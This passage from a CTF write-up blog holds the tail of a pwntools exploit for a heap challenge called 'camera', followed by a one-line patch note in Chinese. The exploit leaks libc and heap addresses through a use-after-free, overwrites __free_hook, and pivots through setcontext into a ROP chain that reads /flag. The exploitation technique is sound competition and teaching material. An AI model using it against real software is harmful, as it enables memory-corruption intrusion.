class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>basetest=leak-(<span class="hljs-number">0x7f6b272bebe0</span>-<span class="hljs-number">0x7f6b270d2000</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br>buy(<span class="hljs-number">0x500</span>-<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#1</span><br><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#3</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#4</span><br>load(<span class="hljs-number">3</span>)<br>load(<span class="hljs-number">4</span>)<br><br>shoot(<span class="hljs-number">2</span>)<br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#3</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#4</span><br>load(<span class="hljs-number">3</span>)<br><br>shoot(<span class="hljs-number">1</span>)<br>heap=u64(p.recvuntil(<span class="hljs-string">&quot;\x0a&quot;</span>)[-<span class="hljs-number">7</span>:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>heap_base=heap-(<span class="hljs-number">0x55a4f99e6220</span>-<span class="hljs-number">0x55a4f99e5000</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_base))<br><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#5</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#6</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#7</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#8</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#9</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#10&lt;&lt;&lt;9</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#10</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#11</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#12</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#13</span><br>load(<span class="hljs-number">11</span>)<br>load(<span class="hljs-number">12</span>)<br>load(<span class="hljs-number">13</span>)<br>load(<span class="hljs-number">10</span>)<br>load(<span class="hljs-number">9</span>)<br>load(<span class="hljs-number">8</span>)<br>load(<span class="hljs-number">7</span>)<br>load(<span class="hljs-number">6</span>)<br>load(<span class="hljs-number">5</span>)<br>load(<span class="hljs-number">4</span>)<br>load(<span class="hljs-number">3</span>)<br>shoot(<span class="hljs-number">30</span>)<br><br>rdx=<span class="hljs-string">b&quot;&quot;</span>+p64(heap_base+<span class="hljs-number">0x1710</span>+<span class="hljs-number">0x10</span>)<br>rop=p64(<span class="hljs-number">0</span>)+rdx<br><br>buy(<span class="hljs-number">0x78</span>,rop+<span class="hljs-string">b&quot;\n&quot;</span>)<span class="hljs-comment">#3</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;/flag\x00&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#4</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#5</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#6</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#7</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#8</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#9</span><br>load(<span class="hljs-number">9</span>)<br>shoot(<span class="hljs-number">2</span>)<br>buy(<span class="hljs-number">0x78</span>,p64(basetest-<span class="hljs-number">0x10</span>+libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>])+<span class="hljs-string">b&quot;\n&quot;</span>)<span class="hljs-comment">#9</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-number">8</span>*<span class="hljs-string">&quot;b&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#10</span><br>buy(<span class="hljs-number">0x78</span>,<span class="hljs-number">8</span>*<span class="hljs-string">&quot;b&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#10</span><br><br>payload=p64(basetest+(<span class="hljs-number">0x151990</span>))<br>buy(<span class="hljs-number">0x78</span>,payload+<span class="hljs-string">b&quot;\n&quot;</span>)<span class="hljs-comment">#10</span><br><br>reg_context = flat(&#123;<br><span class="hljs-number">0x20</span>: p64(basetest+libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>]+<span class="hljs-number">61</span>), <span class="hljs-comment">#call setcontext+61</span><br><span class="hljs-number">0x28</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r8</span><br><span class="hljs-number">0x30</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r9</span><br><span class="hljs-number">0x48</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r12</span><br><span class="hljs-number">0x50</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r13</span><br><span class="hljs-number">0x58</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r14</span><br><span class="hljs-number">0x60</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#r15</span><br><span class="hljs-number">0x68</span>:p64(<span class="hljs-number">0x1420</span>+heap_base),<span class="hljs-comment">#rdi</span><br><span class="hljs-number">0x70</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rsi</span><br><span class="hljs-number">0x78</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rbp</span><br><span class="hljs-number">0x80</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rbx</span><br><span class="hljs-number">0x88</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rdx</span><br><span class="hljs-number">0x98</span>:p64(<span class="hljs-number">0</span>),<span class="hljs-comment">#rcx</span><br><span class="hljs-number">0xa0</span>: heap_base+<span class="hljs-number">0x1c20</span>,<span class="hljs-comment">#rsp</span><br><span class="hljs-number">0xa8</span>: p64(basetest+libc.sym[<span class="hljs-string">&quot;open&quot;</span>]),<span class="hljs-comment">#ret addr</span><br>&#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>, arch = <span class="hljs-string">&quot;amd64&quot;</span>)<br><br>buy(<span class="hljs-number">0x500</span>-<span class="hljs-number">8</span>,reg_context+<span class="hljs-string">b&quot;\n&quot;</span>)<span class="hljs-comment">#10</span><br><br>rop=<span class="hljs-string">b&quot;&quot;</span>+p64(basetest+<span class="hljs-number">0x0000000000023b6a</span>)+p64(<span class="hljs-number">1</span>)+p64(basetest+<span class="hljs-number">0x000000000002601f</span>)+p64(<span class="hljs-number">3</span>)<br>rop+=p64(basetest+<span class="hljs-number">0x0000000000142c92</span>)+p64(<span class="hljs-number">0</span>)+p64(basetest+<span class="hljs-number">0x000000000010257e</span>)+p64(<span class="hljs-number">0x100</span>)+p64(<span class="hljs-number">100</span>)+p64(basetest+libc.sym[<span class="hljs-string">&quot;sendfile64&quot;</span>])<br>buy(<span class="hljs-number">0x500</span>-<span class="hljs-number">8</span>,rop+<span class="hljs-string">b&quot;\n&quot;</span>)<span class="hljs-comment">#10</span><br>load(<span class="hljs-number">3</span>)<br>shoot(<span class="hljs-number">7</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h2><p>指针未清零，会有 UAF，patch 的时候把这里置零就过了。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/12/04/TPCTF%20%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/">← Next TPCTF Reverse 复现记录</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/08/Assembly%20Crash%20Course/">PWN College CSE 466 - Assembly Crash Course Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezgame"><span class="toc-number">1.</span> <span class="toc-text">ezgame</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#patch"><span class="toc-number">1.1.</span> <span class="toc-text">patch</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#how2stack"><span class="toc-number">2.</span> <span class="toc-text">how2stack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#patch-1"><span class="toc-number">2.1.</span> <span class="toc-text">patch</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#camera"><span class="toc-number">3.</span> <span class="toc-text">camera</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#patch-2"><span class="toc-number">3.1.</span> <span class="toc-text">patch</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>